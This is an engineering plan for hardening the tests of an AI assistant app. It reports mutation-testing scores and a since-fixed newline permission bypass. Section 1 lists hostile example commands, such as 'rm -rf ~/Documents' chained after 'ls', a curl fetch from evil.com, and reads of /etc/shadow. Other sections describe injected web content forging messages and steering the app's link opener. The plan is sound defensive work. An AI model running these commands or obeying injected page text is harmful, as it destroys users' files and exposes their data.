# Test hardening plan

**Status: PROPOSED (awaiting owner greenlight)**

Measured mutation testing of the whole repo against the standard the snapshot subsystem was
held to, a prioritised plan to close the gap, and one live bug the measurement found.

---

## 0. The measurement

**The suite kills 76% of Python mutations and 30% of Rust mutations. The snapshot subsystem
killed 39 of 39.** The rest of the repo is 24 points below its own bar in Python and 70 points
below it in Rust — and the shortfall is concentrated in exactly the machinery whose job is
safety: the permission classifier, the shell bridge that carries API keys, the keychain module,
and the enforcement points where the validators are actually called.

That framing is the argument for this document, and it should not be softened. It is also not
the worst of it. The measurement turned up **one live, reproducible defect**: in OPEN mode a
single shell command can delete a user's files with **zero permission cards**, because the
read-only allowlist does not treat a newline as a command separator. That is the destructive-prompt
rule — a documented safety property — failing silently on today's build.

| Tier | Mutations | Killed | Rate |
|---|---|---|---|
| **Snapshot subsystem** (prior rounds, three passes) | 39 | 39 | **100%** |
| **Python — rest of repo** | 80 | 61 | **76%** |
| **Rust shell** | 23 | 7 | **30%** |
| Combined sampled (ex-snapshots) | 103 | 68 | **66%** |

Baseline, re-verified for this document: `pytest tests/ -q` → **658 passed, 1 xfailed, 8.17s**.
Rust: **31 `#[test]`** across 4 of 7 files. Frontend: **72 vitest tests**, 8 files, against
**21 components** and **7 hooks**.

### Per-module kill rate (Python)

| Module | Rate | Note |
|---|---|---|
| `shell_bridge.py` | **0/3** | every error path unpinned; carries provider keys (G1) |
| `rpc/widgets.py` | **0/2** | SAFE invariant 4's enforcement point |
| `models_catalog.py` | **0/1** | |
| `providers/` retry · anthropic | 1/2 · 1/2 | |
| `providers/router.py` | 3/5 | |
| `tools/web_search.py` | 2/3 | |
| `tools/base.py` · `undo_manager.py` | 3/4 · 3/4 | |
| `tools/registry.py` · `tools/run_command.py` | 4/5 · 4/5 | see §1 — the survivor here is the live bug |
| `orchestrator.py` | 6/8 | |
| `permissions/gate.py` · `widgets.py` | 6/7 · 6/7 | |
| `routines/` · `memory/store.py` · `profiles` · `skills` · `policy` · `rpc/conversation` · `rpc/providers` | **21/21** | |

### Per-file kill rate (Rust)

| File | Tests | Mutations | Killed |
|---|---|---|---|
| `keychain.rs` | 20 | 10 | **3** |
| `filesystem.rs` | 4 | 7 | **1** |
| `ipc.rs` | 6 | 3 | 2 |
| `app_build.rs` | 1 | 1 | 1 |
| `agent_process.rs` | **0** | 2 | **0** |
| `main.rs` / `updater.rs` | 0 | — | (correctly untested: wiring and an unwired stub) |

**The shape of the gap, in one sentence: the pure logic modules are excellent and the boundaries
are unpinned.** `widgets.py` scores 86% while `rpc/widgets.py` — the two places production
actually calls the validator — scores 0%. `keychain.rs` has 20 tests and kills 3 of 10 mutations,
because the tests exercise everything *around* the OS-keychain seam and nothing across it. The
gate is tested directly and thoroughly; the orchestrator's use of it in OPEN mode is never
exercised at all.

### Method integrity

This matters more than the number, because round one of the snapshot subsystem passed eight gates
while broken. Every anchor was asserted to match exactly once (0 anchor errors in 83 attempts).
`__pycache__` was purged per run with `PYTHONDONTWRITEBYTECODE=1`. A deliberate **control mutant**
— a semantically inert line in `calculator.py` — **survived**, confirming the harness reports
honestly rather than killing everything.

Three mutants were **excluded from the denominator** rather than banked as survivors: one control,
and two `gate` mutants whose anchor matched a `def` line so the replacement landed in a docstring
and left the real body intact. Re-run correctly, **both were killed**. A second reviewer hit the
same trap independently and corrected it the same way. Scoring an equivalent mutant as a survivor
manufactures a fake hole, which is the same class of error as a test that cannot fail — so it is
flagged here rather than quietly improving the number.

**What the number does not cover.** These are mutations *we chose*. 76% is a lower bound on the
modules sampled and says nothing about `main.py` (1747 lines), `read_web_page.py` (850, sampled
only with a control), or the TypeScript tree. The snapshot subsystem was **not** re-mutated here —
its 100% is inherited from the prior rounds, not re-verified.

### Where the four assessments disagreed, and the resolution

1. **Is the OPEN destructive path broken, or merely untested?** Both, in different places, and
   they are not in conflict. The orchestrator's *wiring* is correct — it calls
   `call_is_destructive` and passes `detail` through, verified by probe. The *classifier it asks*
   returns the wrong answer for chained commands. So: the orchestrator has a missing test, the
   classifier has a live bug. Fixing either alone leaves the hole open.
2. **Does the permission card receive `detail`?** On the OPEN destructive path, yes —
   `_request_per_invocation` calls `self._on_request(tool_id, detail)`. On the SAFE path, no —
   `request()` calls `self._on_request(tool_id)` and the computed `detail` is discarded. Both
   readings were right about different code paths. Confirmed in `permissions/gate.py`.
3. **Rust kill rate: 30%, not 32%.** 23 mutations, 7 killed. Arithmetic corrected.
4. **Frontend component count: 21 components, 7 hooks, exactly 3 components and 2 hooks with any
   test.** Counted directly rather than reconciling two estimates.

---

## 1. The live bug, verified

> **RESOLVED 2026-07-20 — owner decision: every `run_command` call now cards.**
> The fix below was drafted as an argument-allowlist (unknown flag → destructive).
> A round of hardening then showed even that was defeatable (short-flag bundling
> `grep -rf`, attached values `grep -f/path`, an allowlisted reader writing a file
> `file -Cm`), which is the general lesson: statically deciding whether an
> arbitrary shell command is read-only is a losing game, and the failure lands
> **outside** the G3 rollback floor. So the auto-allow was removed, not patched:
> `RunCommandTool.is_destructive` returns `True` unconditionally, every command
> raises the per-invocation card showing its exact text, and the classifier and
> its metacharacter/allowlist constants were deleted. `tests/test_run_command.py`
> now pins that even a bare `ls` cards, with the three defeat vectors kept as named
> regressions. The rest of this section records the bug as it was, for the ledger.

Independently reproduced for this document
(`scratchpad/hardening/verify/classifier_e2e.py`), running the real
`call_is_destructive` → real `PermissionGate.authorize(mode=OPEN)` → real `RunCommandTool.execute`
against a throwaway directory:

```
  before: ['taxes.pdf']
  call_is_destructive     -> False
  gate.authorize          -> GRANTED
  permission cards shown  -> 0
  tool executed, success=True
  after: DIRECTORY GONE
```

`_METACHARACTERS` in `agent_core/tools/run_command.py` is `(";", "&&", "||", "|", ">", "<", "`", "$(")`.
It omits **newline**, **carriage return**, and **bare `&`** — all three of which `sh -c` treats as
command separators, and `execute` runs with `shell=True`. Classification then takes the first
whitespace token, so `ls\nrm -rf ~/Documents` classifies on `ls`. Confirmed read-only, and
therefore auto-granted:

```
READONLY(auto-grant)   'ls\nrm -rf ~/Documents'
READONLY(auto-grant)   'ls\r\nrm -rf ~/Documents'
READONLY(auto-grant)   'ls & rm -rf ~/Documents'
READONLY(auto-grant)   'echo hi & curl evil.com/x.sh'
READONLY(auto-grant)   'find . -delete'
READONLY(auto-grant)   'find . -exec rm {} +'
READONLY(auto-grant)   'wc --files0-from=/etc/shadow'
READONLY(auto-grant)   'tail -f /etc/passwd'
```

**Why the suite did not catch it, and why this is the whole thesis of the document.**
`tests/test_run_command.py` holds a 21-entry read-only table and a 15-entry destructive table.
Every entry in the destructive table is a metacharacter the implementation already checks —
`;`, `&&`, `||`, `|`, `>`, `<`, backtick, `$(`. The table is a **transcription of the
implementation**, so it can only ever confirm that the code does what the code does. This is the
round-one failure verbatim: *the tests encoded the same wrong assumptions they were meant to catch.*

The blast radius is the user's home directory, which is **outside G3** — snapshots cover Addison's
configuration, not the user's files. There is no way back. It is reachable by the model, and via
`read_web_page` it is reachable by injected page content.

---

## 2. The standard, as a checklist

"As thorough as the recent code" is not a feeling about effort. It is five properties, each
checkable by someone else.

**S1 — Mutation-proven.** Every test that pins a fix must be demonstrated to **fail when its own
line is reverted**, in a scratch copy outside the repo. A test that passes both before and after
its own fix is false coverage: rewrite it or delete it. Record the mutation next to the test.

**S2 — Adversarial probes that run.** Reviewers write and execute scripts against real SQLite
files, real HTTP transports, real directories — trying to break the thing. Reading the code and
reasoning about it does not count and has repeatedly missed what a probe found in under a minute.

**S3 — Fault injection.** For any recovery or consent path, inject the failure modes explicitly:
handler raises, handler returns the wrong type, handler returns `None`, transport times out, file
is unreadable, database is corrupt. Every one must **degrade inert** — fail closed, never fail open.

**S4 — Doc-versus-code.** Every factual claim in prose is verified by execution. Where they
diverge, one of them changes. Two divergences found in this pass: `RiskTier.HIGH`'s docstring says
"SAFE mode: not permitted at all" while a HIGH tool sits in the SAFE view (§4.4), and CLAUDE.md
says the card "carries the exact command text… so the user knows precisely what they are
approving" while the component clips it to one line (§4.9).

**S5 — Pin the call site, not just the unit.** A validator with 86% mutation coverage and a
0%-covered caller is an untested validator. For every safety check, name the production call sites
and pin each one.

### The anti-patterns this project has actually shipped

Not hypotheticals. Each of these is in the repo right now, and each shipped through review.

- **The transcribed table.** `test_run_command.py`'s destructive list contains exactly the
  separators the implementation handles. It agrees with the code by construction and cannot detect
  that the code is incomplete. **This one is currently hiding a live file-deletion bypass.**
  *Antidote:* test the decision procedure, not a list of examples — assert the classifier tokenises
  with `shlex`, finds exactly one command word, and that the word is in the frozenset. Then the
  test fails when the implementation is looser than the model.
- **The hand-built literal.** `keychain.rs:469` `get_device_key_response_shape` builds
  `let response = json!({...})` **in the test body** and then asserts
  `response.get("privateKey").is_none()` — asserting that a dict the test just wrote without a
  `privateKey` has no `privateKey`. Its own comment says "mirroring the handle() arm". It cannot
  fail. This is why adding the ed25519 private seed to the real response — a direct G1 breach —
  passes all 31 Rust tests. *Antidote:* call the production builder. The same bug was found and
  fixed in `app_build.rs`; the fix pattern already exists in-repo.
- **The fixture that omits the call production makes.** Every gate stub in `test_orchestrator.py`
  and `test_routines.py` is `lambda tool_id: ...` — one argument. Production's per-invocation
  destructive path calls `on_request(tool_id, detail)` with two. Those fixtures are *structurally
  incapable* of exercising the path they appear to cover.
- **The fixture that omits the distinguishing case.** Both `test_prune_*` tests use rows that are
  *all* already past the cutoff, so flipping the cutoff's sign changes nothing they observe. Only
  the `keep_last` floor is pinned; the age half of the rule is invisible.
- **The self-referential bound.** `test_over_long_title_rejects` asserts on `MAX_TITLE_LEN + 1`
  and `MAX_TITLE_LEN`, so it adapts to any value — raising the bound 60 → 60000 passes. It can
  detect that a comparison exists, never that the bound is right. Contrast `test_pinned_cap_is_six`
  four lines below, which hard-pins the number and would catch it.
- **The passing serialization test.** The `web_search` forgery — a page written with apostrophes
  could close a dict and forge a user message inside the untrusted wrapper — was live from the day
  the tool shipped, through every review, with tests green. It was found only when a new tool made
  the same mistake visible.

**One test that would have caught the thing is worth more than thirty that describe it.**

---

## 3. The floors first

For each floor: the test that fails if it silently stops holding. Where none exists, that is the
top of the plan.

### G2 — "Addison never triggers itself" — **no meaningful coverage. Worst floor in the repo.**

Exactly **one** test exists repo-wide: `test_snapshot_subsystem_never_schedules_itself`
(`test_snapshots.py:2129`), an AST scan for `threading`/`sched`/`asyncio`/`signal` imports **scoped
to `snapshot_manager.py` alone**. Verified: no other file in `tests/` references G2 or
self-triggering.

For `main.py`, `orchestrator.py`, `routines/engine.py`, `rpc/*.py`, or the Rust `agent_process.rs`,
the honest answer to "what fails if G2 stops holding" is **nothing**. And the one test's technique
does not generalise: `main.py` imports `threading` legitimately, so a bare import ban would either
fail on correct code or have to be weakened to uselessness.

**Write:** a repo-wide structural test that walks the AST of all of `agent_core/` and asserts that
no module reachable from a tool, routine, widget, or provider can call the orchestrator's turn
entry point — and that no timer/scheduler callback is ever wired to it. Then mutation-test it by
adding a `threading.Timer` that fires a turn, and confirm it dies.
**Kills:** `g2-01` — a `threading.Timer(60, orchestrator.run_turn)` registered in `rpc/routines.py`.
**Cost:** ~1 day, including getting the reachability analysis honest enough not to be noise.
**Urgency:** this must land **before step 8** (the automation keyword gate), which is the step that
makes G2 load-bearing rather than theoretical.

### G1 — "keys never reach the frontend or SQLite" — partial, and the transport is the hole.

Strong on the provider side (58 key-related test references) and strong in Rust *around* the
keychain seam (20 tests). But:

- **`shell_bridge.get_provider_key` — the function that actually moves keys — has zero tests**, and
  two independent mutations to it survived: dropping the `{"provider": provider}` argument (wrong
  key, or a silent fall back to the legacy `provider-key:primary` entry), and returning the whole
  frame repr instead of `result["key"]`.
- **Mutation K1 — adding the ed25519 private seed to the real `keychain.getDeviceKey` response —
  survives all 31 Rust tests**, because the two tests that would catch it are hand-built literals
  (§2). This is a G1 breach that ships green today.
- Key-cache promises are untested: "evicted on Remove" (K3) and refreshed on Replace (K4) both
  survive. Remove a key, keep chatting, and requests still succeed with the removed key.

**Write:** (a) the `keychain.rs` builder split — extract `device_key_response()` /
`sign_relay_response()` out of `handle()` following the existing `app_build.rs` pattern, rewrite
the two tests to call them, and add one test that serialises **every** keychain response and
asserts the private seed's base64 appears in none. (b) A **systemic** Python test: run an
end-to-end turn with a sentinel key, then scan every SQLite table, every emitted IPC frame, the
transcript, `usage_log`, and every snapshot sidecar for the sentinel — one test, all sinks, so a
new sink is covered by construction. (c) Error-path fuzzing: provider raising with the key in the
message, in `__cause__`, in an `httpx.Request` repr, in a retry log.
**Kills:** `K1` (private seed in response), `K3`/`K4` (cache coherence), `sb-03` (frame repr
returned as key), `sb-04` (provider argument dropped).
**Cost:** ~1.5 days. The Rust half is ~40 lines and **is already written and proven** in the
scratchpad — it fails with K1 applied and passes without.

### G3 — "guaranteed rollback" — **comfortably the strongest, and the model for the rest.**

146 tests, mutation-hardened across three rounds, fault-injected at eight failure modes,
doc-verified. `test_restore_always_works_from_a_broken_config` passes. The source-level guard
`test_no_snapshot_query_filters_on_created_in_mode` is exactly the right instinct: it stops someone
adding `AND created_in_mode = ?` next quarter, which a behavioural test never would.

**Write:** nothing new. **Re-verify by mutation** on a schedule (§7): revert
`_permanent_row_matching`, revert the retention "newest two" exemption to one, and confirm named
tests die. Coverage is 86% line on `snapshot_manager.py` — which is precisely why coverage is not
the signal here (§7).

### G4 — "undeletable anchor on weakening" — mechanism tested, path does not exist yet.

56 test references, and permanence is enforced by `RAISE(ABORT)` **database triggers** rather than
a `WHERE` clause someone can forget — structurally right. But **`mint_anchor()` has no production
caller** (verified: only docstrings and tests reference it), because the Custom-profile guard
toggle that mints an anchor is step 2.

**Write:** `test_the_anchor_minting_site_exists`, marked `@pytest.mark.xfail(strict=True)` now.
The repo already uses exactly this pattern at `test_ipc_snapshots.py:1030` for the workspace-trust
rule. `strict=True` means it fails loudly the moment step 2 lands and the rule becomes real — the
rule precedes the capability instead of chasing it.
**Kills:** `g4-01` — step 2 ships a guard toggle that saves without minting an anchor.
**Cost:** ~1 hour. **Do this one now**, as part of adopting the plan.

---

## 4. The work plan, ordered by consequence

Ordered by what a user experiences when it fails, not by module layout. Every item names the
mutation it must kill; an item that cannot name its mutation is not specified yet.

### Tier 0 — a silent failure here means a user cannot get back to a working machine

**H1. `run_command` destructive classification. — DONE 2026-07-20.** Shipped, not
by hardening the classifier (see §1) but by removing it: every command cards. The
classifier is gone, so there is no per-flag table to maintain and no separator
corpus to keep exhaustive — the whole class of `rc-0x` survivors is closed at the
root rather than one entry at a time. `tests/test_run_command.py` asserts the
property (even `ls` cards) with the newline, bundled-flag and `file -Cm` vectors
kept as named regressions, and the mutation `is_destructive → False` fails five
tests across `test_run_command.py` and `test_policy_modes.py`. No open work.

**H2. `keychain.rs` builder split + private-seed test.** ~0.5 day. *Ranks second because a G1
breach currently ships green, and the fix is already written and proven.* Covered in §3/G1.
**Kills:** `K1`, `K10` (dropped `getDeviceKey` arm).

**H3. The SAFE/OPEN execution boundary.** ~1 day. *Ranks third because the invariant is real, the
prose is confident, and the enforcement is a convention the next tool will not inherit.*
`registry.is_dev_only()` has **zero callers in `agent_core/`** (verified). Both dispatch sites —
`orchestrator.py:214` and `routines/engine.py:184` — do a bare `registry.get(tool_id)`. The
boundary holds today only because `run_command.execute` remembered to check `context.policy_mode`
itself. A future `dev_only` tool that forgets the belt is callable on Mira's Simple profile.
- `test_no_dev_only_tool_executes_under_safe_mode`, parametrized over **every registered**
  `dev_only` tool — so it covers tool #2 automatically.
- A **source-level** test that `is_dev_only` is consulted on the execute path in both dispatchers
  (same AST technique as the `created_in_mode` guard). This is the one that survives next quarter.
- The routine path must fail **at the gate or the dispatcher**, and the test must assert *where* —
  today it fails inside the tool, one refactor from being wrong.
**Kills:** `ml-01` (a second `dev_only` tool with no self-check reaches execute under SAFE).

**H4. Registry undo enforcement — substance, not presence.** ~1 day. *Ranks here because the spec
calls this "the single most important test in the codebase" and it currently tests the wrong thing.*
Verified: the check is `getattr(type(tool), "undo", None) is not None and not abstract`, so both of
these register at HIGH and land in the SAFE view:

```
  no-op undo             REGISTERED at RiskTier.HIGH  <- check did not fire
  non-callable undo      REGISTERED at RiskTier.HIGH  <- check did not fire   (undo = "not even callable")
  SAFE view contains: ['sneaky']
```

CLAUDE.md's "do NOT satisfy this with a no-op `undo()`" is prose with no enforcement.
- `test_a_no_op_undo_does_not_satisfy_the_undo_requirement` (fails today). Enforcement: require
  `undo` callable **and** its body non-trivial (`__code__.co_code` is not a bare `return None`), or
  require a declared `undo_payload` contract. Pick one and pin it.
- `test_undo_must_be_callable`.
- `test_no_high_tier_tool_is_ever_in_the_safe_view` — resolves the `RiskTier.HIGH` docstring
  divergence (S4) one way or the other.
- **Round-trip undo per tool:** for every registered non-LOW tool, execute → assert observable
  state changed → `undo()` → assert state byte-identical to before. This is the only test that
  proves an `undo` is real, and it is **absent for every tool**.
**Kills:** `reg-03` (no-op undo accepted), `reg-04` (non-callable undo accepted), `reg-02`
(Protocol-default `undo` satisfies the check).

**H5. G2 repo-wide structural test.** ~1 day. Covered in §3/G2. **Kills:** `g2-01`.

### Tier 1 — a safety invariant switches off silently, or the consent surface lies

**H6. Pin SAFE invariant 4 at its enforcement points.** ~0.5 day. `rpc/widgets.py` scores **0/2**.
Removing **both** the `confirmSave` re-validation and the `widget.list` render-time filter leaves
the suite **658-green** — and a `{"kind":"command","command":"rm -rf ~/Documents"}` widget then
**saves and renders on the Simple profile's rail**. Each layer currently catches the other's
removal, which is good design, but neither is pinned.
**Kills:** `rpc-02`, `rpc-03`.

**H7. Orchestrator at `mode=OPEN`.** ~0.5 day. `run_turn` is **never** called with
`PolicyMode.OPEN` anywhere in the suite, and every gate stub is a one-argument lambda against a
two-argument production call (§2). One test that runs a turn at OPEN with a destructive
`run_command` and asserts a card was raised carrying the exact command text closes both.
**Kills:** `orc-05` (OPEN tool set offered in SAFE), `orc-06` (call never marked destructive).

**H8. `shell_bridge.py` error paths.** ~0.5 day. Scores **0/3**; the only test is a happy-path
round trip that never feeds an error frame and never lets a call time out. A keychain denial or a
refused file write currently returns "success" with empty data — the tool then reports completion
to the user for something that did not happen. Three tests: an error frame, a timeout, a key fetch.
**Kills:** `sb-01` (timeout falls through), `sb-02` (error frame read as success), `sb-03`.

**H9. `PermissionCard` — three verified defects on the consent surface.** ~1 day.
- `PermissionCard.tsx:42` renders the command in a `truncate` class — single-line, ellipsis. The
  core truncates at `MAX_PERMISSION_DETAIL_CHARS = 120` *precisely so the whole thing can be
  shown*; the card then clips to whatever fits the rail.
  `git status --short && rm -rf ~/Documents/…` reads as `git status --short && rm -r…`. The full
  text is in a `title=` tooltip — **hover is not consent**, and the personas are 54 and 68. This
  is an S4 divergence from CLAUDE.md's "carries the exact command text".
- A multi-line command hides its tail (same cause).
- `splitCommand` uses `description.indexOf("run: ")` — first occurrence anywhere — so a SAFE
  description reading *"This routine will run: it needs your calendar to do that."* renders
  ordinary prose in the mono chip whose visual grammar means *this is the exact command*.
- **Structural:** `RUN_PREFIX = "run: "` re-parses a sentence the core composes at
  `main.py:1289` (`f"This time it wants to run: {detail}"`). Two hardcoded strings, two languages,
  nothing connecting them. Reword the core and the mono chip silently disappears with zero test
  failures — the same string-punning-across-a-trust-boundary shape as the `web_search` forgery.
  **Fix: send `command` as a structured field on `permission.requestGrant`**, and add that payload
  to the drift-fixture rig (H11).
**Kills:** `pc-01` (`truncate` retained), `pc-02` (prose rendered as command), `pc-03` (core
reword silently disables the chip).

**H10. Gate fault injection and denial semantics.** ~0.5 day. `authorize` returns whatever
`_on_request` returns, so a handler returning `None` currently yields a non-DENIED status and the
call proceeds. Inject: handler raises, returns a non-`PermissionStatus`, returns `None`, blocks
past a timeout. All four must **fail closed**. Plus: a turn-denial is bypassable by reclassifying
the same call as non-destructive; `revoke()` has no effect on the OPEN auto-grant path; and
`revoke_all()` — called after a G3 restore — leaves denials intact.
Also decide the SAFE-path `detail` question (§0.4): SAFE deliberately uses coarse session grants,
but *computing* a `detail` and then discarding it at `request()` is not the same decision as not
computing one. **Owner call needed.**
**Kills:** `gate-08` (`None` from handler proceeds), `gate-05` (`grant()` no longer clears denial),
`gate-09` (reclassification bypasses a turn denial).

**H11. `FileState` allowlists + the Core→Shell seam.** ~1.5 days. Four Rust mutations survive
because the tests will not cross the `AppHandle` seam: `delete_file` deleting **any** path,
`restore_file` writing **any** path, `read_scoped_file` accepting a raw path as a handle (the core
escapes the picker), and `open_external` opening `file://` / `javascript:`. "Addison can only
remove a file it just created" is currently guaranteed **by a comment**. Make `FileState`
constructible without an `AppHandle` (take `&FileState`, not `&AppHandle`). Add a source-level test
that the `shell.*`/`keychain.*` string literals matched in Rust equal the `Method` constants in
`protocol.py` — 13 strings hand-synced across a language boundary with nothing enforcing them.
**Kills:** `F1`, `F2`, `F3`, `F4`, `F7` (renamed Rust arm).

**H12. Extend the payload-drift fixture rig.** ~0.5 day. `tests/ipc_fixtures.py` +
`test_ipc_fixture_drift.py` + `parsers.fixtures.test.ts` is **the single best idea in the repo's
test strategy** — Python generates from live handlers, vitest consumes, so a shape change breaks
both CIs. It covers **6 payloads**. `permission.requestGrant` — the surface where the entire
destructive-prompt rule is rendered to a human — **has no fixture**. Add it, plus
`tool.activityUpdate` for `run_command`, `profile.get`'s `mode`, and
`snapshot.restoreLastWorking`'s result.
**Kills:** `M13` (`riskTier` → `tier` on the routine ask-user card, currently survives).

### Tier 2 — data loss or a wrong answer, no invariant breached

**H13.** ~2 days total, in this order:
- `undo_manager.prune` cutoff sign (`um-04`): correct cutoff retains four recent snapshots,
  flipped retains two — silently discarding a day of undo history. Both existing tests use rows
  already past the cutoff (§2).
- `rpc/undo.py` reporting `ok: True` when `result.success` is False — the user is told the action
  was reversed when it was not, in the one surface whose entire job is "you can get back".
  **37% coverage, no direct tests.**
- `rpc/routines.py` `_ask_user_continue` returning `True` instead of the waiter's answer — a
  routine whose step failed **continues without consent**. Adjacent to SAFE invariant 3.
- `web_search` / `read_web_page`: property-test that for **arbitrary page bytes** the serialized
  tool result parses back to a dict with `untrusted_note` intact and no additional top-level
  message boundary. Assert at AST level that `append_tool_result` uses `json.dumps` — the
  docstring itself calls this "load-bearing", and load-bearing prose deserves a test.
- `providers/router.py`: `resolve()` returning `None` instead of raising turns a clear "no model
  configured" message into an `AttributeError` mid-turn; disconnecting the selected primary leaves
  a dangling selection.
- `tool_call_parser.py` (81 lines, no dedicated test file) — a misparsed tool call is a wrong
  action taken silently. Fuzz it.
- HTTP error page parsed as search results (`ws-03`) — plausible-looking garbage instead of "I
  couldn't reach the web."

**H14. `open_link` IP vetting — a decision, then a test either way.** ~0.5 day. Verified:
`open_link` (SAFE, **model picks the URL**) validates the scheme only, in Python and again in Rust,
with **no IP vetting** — while `read_web_page` does full resolved-IP SSRF and DNS-rebinding vetting
against the same threat. So injected page text can steer Addison to open
`http://192.168.1.1/admin?reset=1` in the user's real browser with their cookies. Browser-mediated,
so weaker than direct SSRF — but it is the same attack, and `open_link` simply predates the vetting
built for `read_web_page`. **This is an accident of build order, not a decision.** Worth making it
a decision.

### Tier 3 — loud, bounded, cheap

Example tests are correct here; do not spend mutation effort. `calculator.py`, `skills.py`,
`profiles.py`, `models_catalog` labels. A wrong number is visible and costs nothing.

---

## 5. What NOT to test

Effort spent on tests that cannot fail is **worse than nothing**, because it buys false confidence.
This project has shipped that mistake three times (§2). Each of these is better verified by looking,
by types, or not at all.

**Do not write, and delete on sight:**
- **"Renders without crashing" tests.** They cannot fail in any way anyone cares about.
- **DOM snapshot tests of `SettingsPage`** (845 lines). Step 2 rewrites it; every snapshot becomes
  noise, and noise trains people to regenerate snapshots without reading them.
- **Tests that rebuild the production value in the test body** and assert on their own literal.
  Two are live in `keychain.rs` right now (§2). This is the highest-value deletion in the repo.
- **Tests whose bound is derived from the constant they are testing** (`MAX_TITLE_LEN + 1`). Pin
  the number or do not write the test.

**Do not automate — verify by looking:**
- **"Does it look right in dark mode."** Contrast, rhythm, whether the fern accent reads as
  decoration, whether the serif/sans pairing holds. A jsdom test asserting class strings here
  **passes while the screen is wrong** — strictly worse than an honest manual checklist. Keep it in
  TESTING-CHECKLIST §13.
- **`MermaidDiagram` SVG output, animation timings, font loading.**
- **Supervisor restart timing and stderr inheritance** (`agent_process.rs` P2/P4). Cheaper and more
  reliable to verify by running the app and killing the core. An automated test is slow, flaky, and
  proves little. *(Note: this is the one place where "don't test it" and "it has 0 tests" coincide —
  the routing decision inside `handle_line` **should** be extracted and tested, §H11; the process
  lifecycle should not.)*

**Do not build:**
- **A WebDriver/Playwright harness over the packaged Tauri app.** Slow, flaky on CI, and the
  failures it finds — a dialog doesn't open, a font doesn't load — are exactly the failures that are
  cheaper to find by opening the app.
- **Unit tests for `rfd`, `arboard`, `open::that`, or the `updater.rs` stub.** Testing that a
  library is a library.

**Better served by types than tests:** the six TS-only payload interfaces (`ChatMessage`,
`PermissionRequest`, `ActivityUpdate`, `RiskTier`, `PermissionStatus`, `ModelRole`) have **no Python
counterpart to diverge from** — they are built ad hoc in `main.py`/`rpc/*.py`. Do not write drift
tests for all of them; give the load-bearing ones a generated fixture (H12) and leave the rest to
review.

---

## 6. Sequencing against Phase 2

Steps 2–8 are unbuilt. Three of them widen the attack surface materially, and **testing a floor
before the capability lands is worth several times more than after** — after, the test has to be
retrofitted around code that already works, which is how you get a test that agrees with the
implementation.

| Land before | Because |
|---|---|
| **H4** (undo substance), **H14** (open_link decision) | **Step 2 — Custom profile + guards.** Step 2 is the first time a *user* can weaken a guard. The undo contract must mean something before the guard model leans on it. |
| **G4 xfail** (§3) | **Step 2.** `mint_anchor` gets its caller here. The `strict=True` xfail fails loudly the moment it lands. |
| **H1, H3, H4, H11** | **Step 5 — harness + workspace-trust.** The harness is the single largest widening in Phase 2: real project work, real file edits, real commands. H1 is the classifier that harness leans on; H3 is the boundary that keeps it out of Simple; H11 is the file-scope allowlist it will hammer. **Shipping the harness on today's classifier would be a mistake** — it multiplies the blast radius of a bug that already exists. |
| **H6** (invariant 4 at its call sites) | **Step 6 — widget capability tiers.** Step 6 expands the safe vocabulary (to-do, note, timer). The tier boundary must be pinned at `confirmSave` and `list` *before* new kinds arrive, or the expansion is unreviewable. |
| **H10** (gate fault injection), **H8** (shell_bridge) | **Step 7 — MCP client.** MCP admits **externally-authored tools** through the registry and gate. Every fault-injection case in H10 becomes reachable by a third party. A gate that fails open on a handler returning `None` is acceptable-ish with four in-repo tools and unacceptable with an MCP server. |
| **H5** (G2 repo-wide) | **Step 8 — automation keyword gate.** Step 8 is where G2 stops being theoretical. Landing the structural test first means step 8 is *built against* an enforced floor. |

Steps 3–4 (routing strategies, free endpoints) can proceed in parallel — they need only H13's
router items, which are Tier 2. One caveat: free/gray-area endpoints make untrusted-content
screening load-bearing, and that is still explicitly v2. Do not let step 4 quietly pull it forward.

---

## 7. How to keep it

**Is mutation testing worth wiring into CI? Not as a blocking gate. Yes as a sampled nightly.**

Blocking CI on mutation testing is the wrong trade here. The suite runs in 8.2s; a full mutation
pass over `agent_core/` is minutes to tens of minutes, and worse, **mutation scores are noisy at the
margin** — equivalent mutants (three in this pass alone, §0) mean a hard threshold either gets
tuned down to uselessness or gets someone in the habit of overriding a red gate. A safety gate
people learn to override is worse than no gate.

**Proposed, in order of cost:**

1. **Nightly sampled mutation run** — 25 mutations drawn from a committed catalogue, weighted toward
   the modules this document scored worst, reporting a trend rather than a pass/fail. Cost: a few
   hours to wire, near-zero to run. This is the honest signal.
2. **The mutation catalogue itself, committed** (`tests/mutations/catalogue.toml`), one entry per
   named mutation in §4, each naming the test that must die. This is the cheap proxy, and it is
   the highest-leverage item in this section: it converts "we mutation-tested it once" into a
   durable artifact that a reviewer can re-run against a PR touching that module.
3. **A blocking gate on the floors only.** ~8 mutations against G1/G2/G3/G4 enforcement points.
   Seconds to run, and these are the assertions where an equivalent mutant is least likely because
   the code is small and deliberate.
4. **Review checklist item, one line:** *"For each test added, name the mutation it kills."* Free.
   It is also the single question that would have caught the `run_command` table, the keychain
   literals, and the prune fixture.

**Do not** add `@vitest/coverage-v8` and set a threshold. **Coverage is the weak signal here and
this repo has the receipt:** `snapshot_manager.py` sits at **86% line / 202 branches** and that is
the subsystem that shipped with its headline requirement inverted through eight green gates. Read
coverage as *"which lines has no test ever touched"* — a floor on ignorance — never as *"which
behaviour is pinned"*. It is worth measuring occasionally to find the 0% modules (it found
`rpc/undo.py` at 37% and `shell_bridge.py` at 63%); it is not worth gating on.

**What stops the decay.** The suite grew 385 → 658 in one day. Growth like that is exactly when
transcribed tables and hand-built literals get written, because the fastest way to add a test is to
describe what the code does. Three defences, cheapest first: the one-line review question above;
the committed catalogue; and one standing rule — **a test added alongside a bug fix must be
demonstrated to fail against the pre-fix code, and the PR must say so.** That last one costs a
reviewer thirty seconds and is the only mechanism here that directly targets the failure mode that
produced round one.

**One documentation debt worth clearing while here.** `VERIFICATION.md` still claims "223+ tests"
against today's 658, and the live-driver scripts it describes explicitly "do not persist". A record
that drifts is a record people stop trusting. Promote the live driver to a committed, marked test
(§8) or mark the document as historical — either is better than a third state where it reads as
current and is not.

---

## 8. Cost, and what to do with a fraction of it

| Band | Items | Cost |
|---|---|---|
| **Tier 0** (H1–H5) | classifier bug fix, keychain G1, dev-only boundary, undo substance, G2 | **~5 days** |
| **Tier 1** (H6–H12) | invariant-4 call sites, OPEN orchestrator, shell_bridge, PermissionCard, gate faults, FileState, drift fixtures | **~5 days** |
| **Tier 2** (H13–H14) | undo/prune, rpc/undo honesty, routine consent, serialization property tests, router, open_link | **~2.5 days** |
| **Keep-it** (§7) | catalogue, nightly sample, floors gate, review line | **~1 day** |
| | | **~13.5 days** |

